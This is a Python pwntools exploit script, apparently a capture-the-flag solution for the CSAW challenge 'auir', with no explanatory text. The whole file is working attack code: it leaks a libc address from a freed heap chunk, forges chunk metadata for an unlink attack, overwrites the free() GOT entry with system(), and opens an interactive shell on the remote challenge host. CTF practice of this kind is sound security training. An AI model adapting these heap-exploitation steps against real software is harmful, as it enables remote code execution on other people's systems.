from pwn import *

def make_zealots(zealot_size, skills):
    conn.sendlineafter(">>", "1")
    conn.sendlineafter(">>", str(zealot_size))
    conn.sendafter(">>", skills)

def destroy_zealots(index):
    conn.sendlineafter(">>", "2")
    conn.sendlineafter(">>", str(index))

def fix_zealots(index, zealot_size, skills):
    conn.sendlineafter(">>", "3")
    conn.sendlineafter(">>", str(index))
    conn.sendlineafter(">>", str(zealot_size))
    conn.sendafter(">>", skills)

def display_zealots(index):
    conn.sendlineafter(">>", "4")
    conn.sendlineafter(">>", str(index))
    conn.recvuntil("[*]SHOWING....\n")
    return conn.recvuntil("\n")[:-1]

def go_home():
    conn.sendlineafter(">>", "5")

def exploit():
    make_zealots(0x88, 'A' * 0x80)
    make_zealots(0x98, 'A' * 0x98)
    make_zealots(0x88, 'A' * 0x88)
    make_zealots(0x88, 'A' * 0x88)
    make_zealots(0x88, '/bin/sh\x00' + 'A' * 0x80)
    destroy_zealots(1)
    MALLOC_HOOK = u64(display_zealots(1)[:8]) - (0x7f4fe82e6b78 - 0x7f4fe82e6b10)
    #00000000003c4b10 V __malloc_hook
    LIBC = MALLOC_HOOK - 0x3c4b10
    log.success("MALLOC_HOOK :0x%x" % MALLOC_HOOK)
    log.success("LIBC :0x%x" % LIBC)
    make_zealots(0x98, 'A' * 0x98)
    fix_zealots(1, 0x90 * 4, "A" * (0xa8) + p64(0x80) + p64(0x605320 - 0x8 * 3) + p64(0x605320 - 0x8 * 2) + "A" * 0x60 + p64(0x80) + p64(0x90))
    destroy_zealots(3)
    #s reloc.write_128 
    #[0x00605080]>
    #s reloc.malloc_56 
    #[0x00605038]>
    #s reloc.free_96 
    #[0x00605060]>
    fix_zealots(2, 0x10, p64(0x0) + p64(0x00605060))
    #0000000000045390 W system
    fix_zealots(0, 0x8, p64(LIBC + 0x45390))
    conn.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        HOST = "pwn.chal.csaw.io"
        PORT = 7713
        conn = remote(HOST, PORT)
    else:
        conn = process("./auir", env={"LD_PRELOAD":"./libc-2.23.so"})
    exploit()

